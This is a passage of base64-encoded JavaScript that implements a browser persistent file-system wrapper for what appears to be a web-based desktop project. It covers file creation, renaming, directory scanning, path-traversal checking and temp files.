7DQogICAgICAgICAgfSwgZnVuY3Rpb24oZXJyKSB7DQogICAgICAgICAgICBmc0Vycm9yKCdmcy5kZWxldGU6IEZpbGUgY2Fubm90IGJlIGFjY2Vzc2VkLicsIGVycik7DQogICAgICAgICAgfSk7DQogICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgIGZzRXJyb3IoJ2ZzLmRlbGV0ZTogRmlsZSBQYXRoIGNhbm5vdCBiZSBhY2Nlc3NlZC4nLCBlcnIpOw0KICAgICAgICB9KTsNCiAgICAgIH0NCiAgICB9LA0KICAgIHJlbmFtZTogZnVuY3Rpb24oZGF0YSkgew0KICAgICAgaWYgKHR5cGVvZihkYXRhLmNhbGxiYWNrKSAhPSAnZnVuY3Rpb24nKSB7DQogICAgICAgIGRhdGEuY2FsbGJhY2sgPSBmdW5jdGlvbigpIHt9Ow0KICAgICAgfQ0KICAgICAgdmFyIGZvbGRlclBhdGg7DQogICAgICBkYXRhLnBhdGggPSBkYXRhLnBhdGg7DQogICAgICBpZiAoZGF0YS50eXBlID09ICdmaWxlJykgew0KICAgICAgICBmb2xkZXJQYXRoID0gZ2V0RmlsZU5hbWUoZGF0YS5wYXRoKTsNCiAgICAgIH1lbHNlIHsNCiAgICAgICAgZm9sZGVyUGF0aCA9IGRhdGEucGF0aDsNCiAgICAgIH0NCiAgICAgIGlmIChkYXRhLnR5cGUgPT0gJ2ZvbGRlcicpIHsNCiAgICAgICAgcm9vdC5nZXREaXJlY3RvcnkoZGF0YS5wYXRoLCB7Y3JlYXRlOiBmYWxzZX0sIGZ1bmN0aW9uKHRhcmdldERpcikgew0KICAgICAgICAgIGZzTG9nKCdmcy5yZW5hbWU6IFN1Y2Nlc3NmdWxseSByZXRyaWV2ZWQgdGFyZ2V0IGRpcmVjdG9yeS4nKTsNCiAgICAgICAgICByb290LmdldERpcmVjdG9yeShnZXRQYXJlbnREaXIoZGF0YS5wYXRoKSwge2NyZWF0ZTogZmFsc2V9LA0KICAgICAgICAgIGZ1bmN0aW9uKHBhcmVudERpcikgew0KICAgICAgICAgICAgZnNMb2coJ2ZzLnJlbmFtZTogU3VjY2Vzc2Z1bGx5IHJldHJpZXZlZCBwYXJlbnQgZGlyZWN0b3J5LicpOw0KICAgICAgICAgICAgdGFyZ2V0RGlyLm1vdmVUbyhwYXJlbnREaXIsIGRhdGEubmV3TmFtZSwgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgIGZzTG9nKCdmcy5yZW5hbWU6IFN1Y2Nlc3NmdWxseSByZW5hbWVkIGZpbGUnKTsNCiAgICAgICAgICAgICAgZGF0YS5jYWxsYmFjayh0cnVlKTsNCiAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgICAgICBmc0Vycm9yKCdmcy5yZW5hbWU6IFVuYWJsZSB0byByZW5hbWUgZmlsZS4nLCBlcnIpOw0KICAgICAgICAgICAgICBkYXRhLmNhbGxiYWNrKGZhbHNlKTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgICAgZnNFcnJvcignZnMucmVuYW1lOiBVbmFibGUgdG8gcmV0cmlldmUgcGFyZW50IGRpcmVjdG9yeS4nLCBlcnIpOw0KICAgICAgICAgICAgZGF0YS5jYWxsYmFjayhmYWxzZSk7DQogICAgICAgICAgfSk7DQogICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgIGZzRXJyb3IoJ2ZzLnJlbmFtZTogRXJyb3IgcmV0cmlldmluZyB0YXJnZXQgZGlyZWN0b3J5LicsIGVycik7DQogICAgICAgICAgZGF0YS5jYWxsYmFjayhmYWxzZSk7DQogICAgICAgIH0pOw0KICAgICAgfQ0KICAgIH0sDQogICAgc2NhbmRpcjogZnVuY3Rpb24oZGF0YSkgew0KICAgICAgZGF0YS5wYXRoID0gZGF0YS5wYXRoOw0KICAgICAgcm9vdC5nZXREaXJlY3RvcnkoZGF0YS5wYXRoLCB7Y3JlYXRlOiBmYWxzZX0sIGZ1bmN0aW9uKGRpcikgew0KICAgICAgICB2YXIgZGlyUmVhZGVyID0gZGlyLmNyZWF0ZVJlYWRlcigpOw0KICAgICAgICB2YXIgZGlyQ29udGVudHMgPSB7cGF0aDogZGF0YS5wYXRoLCBmb2xkZXJzOiBbXSxmaWxlczogW119Ow0KICAgICAgICB2YXIgaW5kZXggPSAwOw0KICAgICAgICBkaXJSZWFkZXIucmVhZEVudHJpZXMoZnVuY3Rpb24oZW50cmllcykgew0KICAgICAgICAgIGRpckNvbnRlbnRzLnBhcmVudEZvbGRlcnMgPSBkYXRhLnBhdGguc3BsaXQoJy8nKTsNCiAgICAgICAgICBkaXJDb250ZW50cy5wYXJlbnRGb2xkZXJzWzBdID0gJy8nOw0KICAgICAgICAgIHdoaWxlIChkaXJDb250ZW50cy5wYXJlbnRGb2xkZXJzLmluZGV4T2YoJycpICE9IC0xKSB7DQogICAgICAgICAgICB2YXIgZW1wdHlQb3MgPSBkaXJDb250ZW50cy5wYXJlbnRGb2xkZXJzLmluZGV4T2YoJycpOw0KICAgICAgICAgICAgZGlyQ29udGVudHMucGFyZW50Rm9sZGVycy5zcGxpY2UoZW1wdHlQb3MsIDEpOw0KICAgICAgICAgIH0NCiAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSAhPSBlbnRyaWVzLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICBsZXQgZnVsbFBhdGggPSBlbnRyaWVzW2ldLmZ1bGxQYXRoOw0KICAgICAgICAgICAgaWYgKGVudHJpZXNbaV0uaXNEaXJlY3RvcnkpIHsNCiAgICAgICAgICAgICAgbGV0IG5hbWVTdGFydCA9IGZ1bGxQYXRoLmxhc3RJbmRleE9mKCcvJykgKyAxOw0KICAgICAgICAgICAgICBkaXJDb250ZW50cy5mb2xkZXJzLnB1c2goew0KICAgICAgICAgICAgICAgIGZ1bGxQYXRoOiBmdWxsUGF0aCwNCiAgICAgICAgICAgICAgICBuYW1lOiBmdWxsUGF0aC5zdWJzdHJpbmcobmFtZVN0YXJ0LCBmdWxsUGF0aC5sZW5ndGgpDQogICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICBpbmRleCsrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGVudHJpZXNbaV0uaXNGaWxlKSB7DQogICAgICAgICAgICAgIGxldCB0eXBlID0gZnVsbFBhdGgubGFzdEluZGV4T2YoJy4nKTsNCiAgICAgICAgICAgICAgbGV0IG5hbWUgPSBmdWxsUGF0aC5sYXN0SW5kZXhPZignLycpOw0KICAgICAgICAgICAgICBpZiAobmFtZSA8IHR5cGUpIHsNCiAgICAgICAgICAgICAgICBkaXJDb250ZW50cy5maWxlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgIGZ1bGxQYXRoOiBmdWxsUGF0aCwNCiAgICAgICAgICAgICAgICAgIG5hbWU6IGZ1bGxQYXRoLnN1YnN0cmluZyhuYW1lICsgMSwgdHlwZSksDQogICAgICAgICAgICAgICAgICB0eXBlOiBmdWxsUGF0aC5zdWJzdHJpbmcodHlwZSArIDEsIGZ1bGxQYXRoLmxlbmd0aCkNCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBkaXJDb250ZW50cy5maWxlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgIGZ1bGxQYXRoOiBmdWxsUGF0aCwNCiAgICAgICAgICAgICAgICAgIG5hbWU6IGZ1bGxQYXRoLnN1YnN0cmluZyhuYW1lICsgMSwgZnVsbFBhdGgubGVuZ3RoKSwNCiAgICAgICAgICAgICAgICAgIHR5cGU6ICcnDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgaW5kZXgrKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChpbmRleCA9PSBlbnRyaWVzLmxlbmd0aCkgew0KICAgICAgICAgICAgICBkYXRhLmNhbGxiYWNrKGRpckNvbnRlbnRzKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgICAgICAgaWYgKGVudHJpZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICBkYXRhLmNhbGxiYWNrKGRpckNvbnRlbnRzKTsNCiAgICAgICAgICB9DQogICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgIGZzRXJyb3IoJ2ZzLnNjYW5kaXI6IEVycm9yIHdoaWxlIGxvYWRpbmcgRm9sZGVyIGNvbnRlbnRzLicsIGVycik7DQogICAgICAgIH0pOw0KICAgICAgfSwgZnVuY3Rpb24oZXJyKSB7DQogICAgICAgIGZzRXJyb3IoJ2ZzLnNjYW5kaXI6IEZvbGRlciBSZWFkIE9wZXJhdGlvbiBGYWlsZWQuJywgZXJyKTsNCiAgICAgIH0pOw0KICAgIH0sDQogICAgcmVjdXJzaXZlbHlTY2FuZGlyOiBmdW5jdGlvbihkYXRhKSB7DQogICAgICBpZiAodHlwZW9mKGFyZ3VtZW50c1sxXSkgIT0gJ2Jvb2xlYW4nKSB7DQogICAgICAgIHJlY3Vyc2l2ZURhdGEgPSB7DQogICAgICAgICAgZm9sZGVyczogW3sNCiAgICAgICAgICAgIGZ1bGxQYXRoOiBkYXRhLnBhdGgNCiAgICAgICAgICB9XSwNCiAgICAgICAgICBmaWxlczogW10sDQogICAgICAgICAgc2NhbnBvczogMCwNCiAgICAgICAgICBjYWxsYmFjazogZGF0YS5jYWxsYmFjaw0KICAgICAgICB9Ow0KICAgICAgICBmcy5yZWN1cnNpdmVseVNjYW5kaXIobnVsbCwgZmFsc2UpOw0KICAgICAgfSBlbHNlIHsNCiAgICAgICAgaWYgKHJlY3Vyc2l2ZURhdGEuZm9sZGVycy5sZW5ndGggIT0gcmVjdXJzaXZlRGF0YS5zY2FucG9zKSB7DQogICAgICAgICAgZnMuc2NhbmRpcih7DQogICAgICAgICAgICBwYXRoOiByZWN1cnNpdmVEYXRhLmZvbGRlcnNbcmVjdXJzaXZlRGF0YS5zY2FucG9zXS5mdWxsUGF0aCwNCiAgICAgICAgICAgIGNhbGxiYWNrOiBmdW5jdGlvbihkYXQpIHsNCiAgICAgICAgICAgICAgZm9yIChsZXQgeCA9IDA7IHggIT0gZGF0LmZvbGRlcnMubGVuZ3RoOyB4KyspIHsNCiAgICAgICAgICAgICAgICByZWN1cnNpdmVEYXRhLmZvbGRlcnMucHVzaChkYXQuZm9sZGVyc1t4XSk7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgZm9yIChsZXQgeCA9IDA7IHggIT0gZGF0LmZpbGVzLmxlbmd0aDsgeCsrKSB7DQogICAgICAgICAgICAgICAgcmVjdXJzaXZlRGF0YS5maWxlcy5wdXNoKGRhdC5maWxlc1t4XSk7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgcmVjdXJzaXZlRGF0YS5zY2FucG9zKys7DQogICAgICAgICAgICAgIGZzLnJlY3Vyc2l2ZWx5U2NhbmRpcihudWxsLCBmYWxzZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgfSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgZGVsZXRlIHJlY3Vyc2l2ZURhdGEuc2NhbnBvczsNCiAgICAgICAgICByZWN1cnNpdmVEYXRhLmNhbGxiYWNrKHJlY3Vyc2l2ZURhdGEpOw0KICAgICAgICB9DQogICAgICB9DQogICAgfSwNCiAgICBleGlzdHM6IGZ1bmN0aW9uKGRldGFpbHMpIHsNCiAgICAgIGRldGFpbHMucGF0aCA9IGRldGFpbHMucGF0aDsNCiAgICAgIGlmIChkZXRhaWxzLnR5cGUgPT0gJ2ZvbGRlcicpIHsNCiAgICAgICAgcm9vdC5nZXREaXJlY3RvcnkoZGV0YWlscy5wYXRoLCB7Y3JlYXRlOiBmYWxzZX0sIGZ1bmN0aW9uKGFyZ3MpIHsNCiAgICAgICAgICBkZXRhaWxzLnBhc3MoKTsNCiAgICAgICAgfSwgZnVuY3Rpb24oYXJncykgew0KICAgICAgICAgIGRldGFpbHMuZmFpbCgpOw0KICAgICAgICB9KTsNCiAgICAgIH1lbHNlIGlmIChkZXRhaWxzLnR5cGUgPT0gJ2ZpbGUnKSB7DQogICAgICAgIHJvb3QuZ2V0RGlyZWN0b3J5KGRldGFpbHMucGF0aCwge2NyZWF0ZTogZmFsc2V9LCBmdW5jdGlvbihhcmdzKSB7DQogICAgICAgICAgYXJncy5nZXRGaWxlKGRldGFpbHMubmFtZSwge2NyZWF0ZTogZmFsc2V9LCBmdW5jdGlvbihhcmdzKSB7DQogICAgICAgICAgICBkZXRhaWxzLnBhc3MoKTsNCiAgICAgICAgICB9LCBmdW5jdGlvbihhcmdzKSB7DQogICAgICAgICAgICBkZXRhaWxzLmZhaWwoKTsNCiAgICAgICAgICB9KTsNCiAgICAgICAgfSwgZnVuY3Rpb24oYXJncykgew0KICAgICAgICAgIGRldGFpbHMuZmFpbCgpOw0KICAgICAgICB9KTsNCiAgICAgIH0NCiAgICB9LA0KICAgIG5ldzogZnVuY3Rpb24oZGV0YWlscykgew0KICAgICAgZGV0YWlscy5wYXRoID0gZGV0YWlscy5wYXRoOw0KICAgICAgaWYgKGRldGFpbHMudHlwZSA9PSAnZm9sZGVyJykgew0KICAgICAgICByb290LmdldERpcmVjdG9yeShkZXRhaWxzLnBhdGgsIHtjcmVhdGU6IHRydWUsZXhjbHVzaXZlOiBmYWxzZX0sDQogICAgICAgIGZ1bmN0aW9uKGFyZ3MpIHsNCiAgICAgICAgICBmc0xvZygnZnMubmV3OiBGb2xkZXIgQ3JlYXRpb24gT3BlcmF0aW9uIFN1Y2Nlc3NmdWwuJyk7DQogICAgICAgICAgaWYgKHR5cGVvZihkZXRhaWxzLmNhbGxiYWNrID09ICdmdW5jdGlvbicpKSB7DQogICAgICAgICAgICBkZXRhaWxzLmNhbGxiYWNrKHRydWUpOw0KICAgICAgICAgIH0NCiAgICAgICAgfSwgZnVuY3Rpb24oYXJncykgew0KICAgICAgICAgIGZzRXJyb3IoJ2ZzLm5ldzogQ2Fubm90IGNyZWF0ZSBmb2xkZXIuJywgYXJncyk7DQogICAgICAgIH0pOw0KICAgICAgfWVsc2UgaWYgKGRldGFpbHMudHlwZSA9PSAnZmlsZScpIHsNCiAgICAgICAgcm9vdC5nZXREaXJlY3RvcnkoZGV0YWlscy5wYXRoLCB7Y3JlYXRlOiB0cnVlLCBleGNsdXNpdmU6IGZhbHNlfSwNCiAgICAgICAgZnVuY3Rpb24oYXJncykgew0KICAgICAgICAgIGZzTG9nKCdmcy5uZXc6IFJlZmVyZW5jZSBGb2xkZXIgT3BlcmF0aW9uIFN1Y2Nlc3NmdWwuJyk7DQogICAgICAgICAgYXJncy5nZXRGaWxlKGRldGFpbHMubmFtZSwge2NyZWF0ZTogdHJ1ZSwgZXhjbHVzaXZlOiBmYWxzZX0sDQogICAgICAgICAgZnVuY3Rpb24obmV3RmlsZSkgew0KICAgICAgICAgICAgZnNMb2coJ2ZzLm5ldzogRmlsZSBDcmVhdGlvbiBPcGVyYXRpb24gU3VjY2Vzc2Z1bC4nKTsNCiAgICAgICAgICAgIGlmICh0eXBlb2YgZGV0YWlscy5kYXRhID09ICd1bmRlZmluZWQnIHx8ICFkZXRhaWxzLmRhdGEpIHsNCiAgICAgICAgICAgICAgaWYgKGRldGFpbHMuY2FsbGJhY2spIHsNCiAgICAgICAgICAgICAgICBkZXRhaWxzLmNhbGxiYWNrKHRydWUpOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICBpZiAoIWRldGFpbHMuZW5jb2RpbmcpIHsNCiAgICAgICAgICAgICAgICBkZXRhaWxzLmVuY29kaW5nID0gJ3RleHQvcGxhaW4nOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgIG5ld0ZpbGUuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uKGZpbGVDb250ZW50KSB7DQogICAgICAgICAgICAgICAgdmFyIGJsb2IgPSBuZXcgQmxvYihbZGV0YWlscy5kYXRhXSx7dHlwZTogZGV0YWlscy5lbmNvZGluZ30pOw0KICAgICAgICAgICAgICAgIGZpbGVDb250ZW50LndyaXRlKGJsb2IpOw0KICAgICAgICAgICAgICAgIGZzTG9nKCdmcy5uZXc6IEZpbGUgV3JpdGUgT3BlcmF0aW9uIFN1Y2Nlc3NmdWwuJyk7DQogICAgICAgICAgICAgICAgaWYgKGRldGFpbHMuY2FsbGJhY2spIHsNCiAgICAgICAgICAgICAgICAgIGRldGFpbHMuY2FsbGJhY2sodHJ1ZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICB9LCBmdW5jdGlvbihhcmdzKSB7DQogICAgICAgICAgICAgICAgZnNFcnJvcignZnMubmV3OiBGaWxlIFdyaXRlIE9wZXJhdGlvbiBGYWlsZWQuJywgYXJncyk7DQogICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0sIGZ1bmN0aW9uKGFyZ3MpIHsNCiAgICAgICAgICAgIGZzRXJyb3IoJ2ZzLm5ldzogRmlsZSBjYW5ub3QgYmUgY3JlYXRlZC4nLCBhcmdzKTsNCiAgICAgICAgICB9KTsNCiAgICAgICAgfSwgZnVuY3Rpb24oYXJncykgew0KICAgICAgICAgIGZzRXJyb3IoJ2ZzLm5ldzogQ2Fubm90IGFjY2VzcyByZWZlcmVuY2UgZm9sZGVyLicsIGFyZ3MpOw0KICAgICAgICB9KTsNCiAgICAgIH1lbHNlIGlmIChkZXRhaWxzLnR5cGUgPT0gJ2Jsb2InKSB7DQogICAgICAgIHJvb3QuZ2V0RGlyZWN0b3J5KGRldGFpbHMucGF0aCwge2NyZWF0ZTogdHJ1ZSwgZXhjbHVzaXZlOiBmYWxzZX0sDQogICAgICAgIGZ1bmN0aW9uKGFyZ3MpIHsNCiAgICAgICAgICBmc0xvZygnZnMubmV3OiBSZWZlcmVuY2UgRm9sZGVyIE9wZXJhdGlvbiBTdWNjZXNzZnVsLicpOw0KICAgICAgICAgIGFyZ3MuZ2V0RmlsZShkZXRhaWxzLm5hbWUsIHtjcmVhdGU6IHRydWUsIGV4Y2x1c2l2ZTogZmFsc2V9LA0KICAgICAgICAgIGZ1bmN0aW9uKG5ld0ZpbGUpIHsNCiAgICAgICAgICAgIGZzTG9nKCdmcy5uZXc6IEZpbGUgQ3JlYXRpb24gT3BlcmF0aW9uIFN1Y2Nlc3NmdWwuJyk7DQogICAgICAgICAgICBuZXdGaWxlLmNyZWF0ZVdyaXRlcihmdW5jdGlvbihmaWxlQ29udGVudCkgew0KICAgICAgICAgICAgICBmaWxlQ29udGVudC53cml0ZShkZXRhaWxzLmRhdGEpOw0KICAgICAgICAgICAgICBmc0xvZygnZnMubmV3OiBGaWxlIFdyaXRlIE9wZXJhdGlvbiBTdWNjZXNzZnVsLicpOw0KICAgICAgICAgICAgICBpZiAoZGV0YWlscy5jYWxsYmFjaykgew0KICAgICAgICAgICAgICAgIGRldGFpbHMuY2FsbGJhY2sodHJ1ZSk7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGFyZ3MpIHsNCiAgICAgICAgICAgICAgZnNFcnJvcignZnMubmV3OiBGaWxlIFdyaXRlIE9wZXJhdGlvbiBGYWlsZWQuJywgYXJncyk7DQogICAgICAgICAgICB9KTsNCiAgICAgICAgICB9LCBmdW5jdGlvbihhcmdzKSB7DQogICAgICAgICAgICBmc0Vycm9yKCdmcy5uZXc6IENvdWxkblwndCBDcmVhdGUgRmlsZScsIGFyZ3MpOw0KICAgICAgICAgIH0pOw0KICAgICAgICB9LCBmdW5jdGlvbihhcmdzKSB7DQogICAgICAgICAgZnNFcnJvcignZnMubmV3OiBDb3VsZG5cJ3QgZ2V0IFJlZmVyZW5jZSBGb2xkZXInLCBhcmdzKTsNCiAgICAgICAgfSk7DQogICAgICB9DQogICAgfSwNCiAgICBjb250ZW50czogZnVuY3Rpb24ocGF0aERldGFpbHMpIHsNCiAgICAgIHZhciBjYWxsYmFjayA9IHBhdGhEZXRhaWxzLmNhbGxiYWNrOw0KICAgICAgdmFyIHBhdGggPSAocGF0aERldGFpbHMub3JpZ2luICsgcGF0aERldGFpbHMucGF0aCkuc3BsaXQoJy8nKTsNCiAgICAgIHZhciB0cnVzdExldmVsID0gMDsNCiAgICAgIHZhciBpc1RydXN0ZWQgPSB0cnVlOw0KICAgICAgdmFyIGZpbmFsRGlyID0gJyc7DQogICAgICB2YXIgZmluYWxGaWxlOw0KICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gcGF0aC5sZW5ndGg7IGkgIT0gaWk7IGkrKykgew0KICAgICAgICBsZXQgc3VicGF0aCA9IHBhdGhbaV0uc3BsaXQoJ1xcJyk7DQogICAgICAgIHN1YnBhdGgudW5zaGlmdChwYXRoKTsNCiAgICAgICAgc3VicGF0aC51bnNoaWZ0KGkpOw0KICAgICAgICBzdWJwYXRoLnVuc2hpZnQoMSk7DQogICAgICAgIHBhdGguc3BsaWNlLmFwcGx5KHN1YnBhdGgpOw0KICAgICAgICBpICs9IHN1YnBhdGgubGVuZ3RoIC0gNDsNCiAgICAgIH0NCiAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IHBhdGgubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgaWYgKGkgPCBpaSAtIDEpIHsNCiAgICAgICAgICBmaW5hbERpciArPSBwYXRoW2ldOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIGZpbmFsRmlsZSA9IHBhdGhbaV07DQogICAgICAgIH0NCiAgICAgICAgaWYgKHBhdGhbaV0gPT0gJy4uJykgew0KICAgICAgICAgIGlmICh0cnVzdExldmVsLS0pIHsNCiAgICAgICAgICAgIGlzVHJ1c3RlZCA9IGZhbHNlOw0KICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIGlmIChwYXRoW2ldICE9PSAnJyAmJiBwYXRoW2ldICE9PSAnLicpIHsNCiAgICAgICAgICB0cnVzdExldmVsKys7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIGlmIChpc1RydXN0ZWQpIHsNCiAgICAgICAgbGV0IGhhbmRsZXIgPSBmdW5jdGlvbih3b3JraW5nRGlyZWN0b3J5KSB7DQogICAgICAgICAgd29ya2luZ0RpcmVjdG9yeS5nZXRGaWxlKGZpbmFsRmlsZSwge2NyZWF0ZTogZmFsc2V9LA0KICAgICAgICAgIGZ1bmN0aW9uKGZpbGVFbnRyeSkgew0KICAgICAgICAgICAgZmlsZUVudHJ5LmZpbGUoZnVuY3Rpb24oZmlsZSkgew0KICAgICAgICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCiAgICAgICAgICAgICAgcmVhZGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWRlbmQnLCBmdW5jdGlvbihjYWxsYmFjaywgZSkgew0KICAgICAgICAgICAgICAgIGNhbGxiYWNrKGUudGFyZ2V0LnJlc3VsdCk7DQogICAgICAgICAgICAgIH0uYmluZCh0aGlzLCBjYWxsYmFjaykpOw0KICAgICAgICAgICAgICByZWFkZXIucmVhZEFzVGV4dChmaWxlKTsNCiAgICAgICAgICAgIH0uYmluZCh0aGlzKSk7DQogICAgICAgICAgfS5iaW5kKHRoaXMpLCBmdW5jdGlvbihlcnIpIHsNCiAgICAgICAgICAgIGZzRXJyb3IoJ1VuYWJsZSB0byBhY2Nlc3MgZmlsZSAnICsgZmluYWxGaWxlLCBlcnIpOw0KICAgICAgICAgIH0uYmluZCh0aGlzKSk7DQogICAgICAgIH07DQogICAgICAgIGlmIChmaW5hbERpciA9PT0gJycpIHsNCiAgICAgICAgICBoYW5kbGVyKHJvb3QpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIHJvb3QuZ2V0RGlyZWN0b3J5KGZpbmFsRGlyLCB7Y3JlYXRlOiBmYWxzZX0sIGhhbmRsZXIuYmluZCh0aGlzKSwNCiAgICAgICAgICBmdW5jdGlvbihlcnIpIHsNCiAgICAgICAgICAgIGZzRXJyb3IoJ1VuYWJsZSB0byBvcGVuIGRpcmVjdG9yeSAnICsgZmluYWxEaXIsIGVycik7DQogICAgICAgICAgfS5iaW5kKHRoaXMpKTsNCiAgICAgICAgfQ0KICAgICAgfSBlbHNlIHsNCiAgICAgICAgbGV0IGUgPSAnU2VjdXJpdHkgRXhjZXB0aW9uOiBOb3QgYWxsb3dlZCB0byBhY2Nlc3MgZmlsZXMgb3V0c2lkZSBvZiAnOw0KICAgICAgICBlICs9IHBhdGhEZXRhaWxzLm9yaWdpbiArICcuIEluY2lkZW50IFJlcG9ydGVkLic7DQogICAgICAgIGxldCBzdGFydFBvcyA9IHBhdGhEZXRhaWxzLm9yaWdpbi5pbmRleE9mKCcvJyk7DQogICAgICAgIGxldCBlbmRQb3MgPSBwYXRoRGV0YWlscy5vcmlnaW4ubGFzdEluZGV4T2YoJy8nKTsNCiAgICAgICAgbGV0IGFwcFR5cGUgPSBwYXRoRGV0YWlscy5vcmlnaW4uc3Vic3RyaW5nKHN0YXJ0UG9zLCBlbmRQb3MpOw0KICAgICAgICBsZXQgYXBwTmFtZSA9IHBhdGhEZXRhaWxzLm9yaWdpbi5zdWJzdHJpbmcoZW5kUG9zLCBwYXRoRGV0YWlscy5sZW5ndGgpOw0KICAgICAgICBsZXQgcmVwb3J0ID0gYXBwVHlwZSArICdhcHAgJyArIGFwcE5hbWU7DQogICAgICAgIHJlcG9ydCArPSAnIHRyaWVkIHRvIGFjY2VzcyAnICsgcGF0aERldGFpbHMucGF0aDsNCiAgICAgICAgZnMuZnNFcnJvcihyZXBvcnQpOw0KICAgICAgICBsZXQgZXJyID0gbmV3IFVSSUVycm9yKGVyck1zZyk7DQogICAgICAgIHBhdGhEZXRhaWxzLmNhbGxiYWNrKGVycik7DQogICAgICB9DQogICAgICAvKg0KICAgICAgICB7DQogICAgICAgICAgb3JpZ2luOiAiL3N5c3RlbS9MaW1pdGVkRnJhbWUiLA0KICAgICAgICAgIHBhdGg6ICJpbnNlY3VyZSwgdW5wcm9jZWVzZWQgZ2l2ZW4gcGF0aCIsDQogICAgICAgICAgY2FsbGJhY2s6IGZ1bmN0aW9uKCl7fQ0KICAgICAgICB9DQogICAgICAqLw0KICAgIH0sDQogICAgcGF0aDogZnVuY3Rpb24oZmlsZURldGFpbHMpIHsNCiAgICAgIGlmICghZmlsZURldGFpbHMpIHsNCiAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdtaXNzaW5nIGNvZGUnKTsNCiAgICAgIH1lbHNlIGlmIChmaWxlRGV0YWlscy50eXBlID09ICdmaWxlJykgew0KICAgICAgICBpZiAoZmlsZURldGFpbHMuZXhwb3J0ID09ICdkb3dubG9hZCcpIHsNCiAgICAgICAgICBmc0xvZygnZnMuZGxQYXRoOiBSZXR1cm5lZCBEb3dubG9hZCBQYXRoIG9mIEZpbGUnKTsNCiAgICAgICAgICByZXR1cm4gJy4uJyArIGZpbGVEZXRhaWxzLnBhdGg7DQogICAgICAgIH1lbHNlIGlmIChmaWxlRGV0YWlscy5leHBvcnQgPT0gJ2Z1bGwnKSB7DQogICAgICAgICAgbGV0IHBhdGggPSAnZmlsZXN5c3RlbTonICsgbG9jYXRpb24ub3JpZ2luICsgJy9wZXJzaXN0ZW50JzsNCiAgICAgICAgICBwYXRoICs9IGZpbGVEZXRhaWxzLnBhdGg7DQogICAgICAgICAgZnNMb2coJ2ZzLmRsUGF0aDogUmV0dXJuZWQgRnVsbCBQYXRoIG9mIEZpbGUnKTsNCiAgICAgICAgICByZXR1cm4gcGF0aDsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0sDQogICAgdG1wRmlsZTogZnVuY3Rpb24oZGF0YSwgY2FsbGJhY2spIHsNCiAgICAgIHZhciByYW5kTmFtZSA9IGNyeXB0by5nZXRSYW5kb21WYWx1ZXMobmV3IFVpbnQzMkFycmF5KDEwKSkudG9TdHJpbmcoKTsNCiAgICAgIGZzLm5ldyh7DQogICAgICAgIHR5cGU6ICdmaWxlJywNCiAgICAgICAgcGF0aDogJy90bXAvJywNCiAgICAgICAgbmFtZTogcmFuZE5hbWUsDQogICAgICAgIGRhdGE6IGRhdGEsDQogICAgICAgIGNhbGxiYWNrOiBjYWxsYmFjay5iaW5kKHRoaXMsIGZzLnBhdGgoew0KICAgICAgICAgIHR5cGU6ICdmaWxlJywNCiAgICAgICAgICBleHBvcnQ6ICdmdWxsJywNCiAgICAgICAgICBwYXRoOiAnL3RtcC8nICsgcmFuZE5hbWUNCiAgICAgICAgfSkpDQogICAgICB9KTsNCiAgICAgIGZzLmV4aXN0cyh7DQogICAgICAgIHR5cGU6ICdmaWxlJw0KICAgICAgfSk7DQogICAgfQ0KICB9Ow0KICBuYXZpZ2F0b3Iud2Via2l0UGVyc2lzdGVudFN0b3JhZ2UucmVxdWVzdFF1b3RhKDEwICogMTAyNCAqIDEwMjQgKiAxMDI0LA0KICBmdW5jdGlvbihncmFudGVkQnl0ZXMpIHsNCiAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCBncmFudGVkQnl0ZXMsDQogICAgZnVuY3Rpb24oZmlsZVN5c3RlbSkgew0KICAgICAgbG9hZGluZ1NjcmVlbi5zZXRNZXNzYWdlKCdGaWxlU3lzdGVtIEluaXRpYWxpemVkIScpOw0KICAgICAgbG9hZGluZ1NjcmVlbi5zZXRQZXJjZW50YWd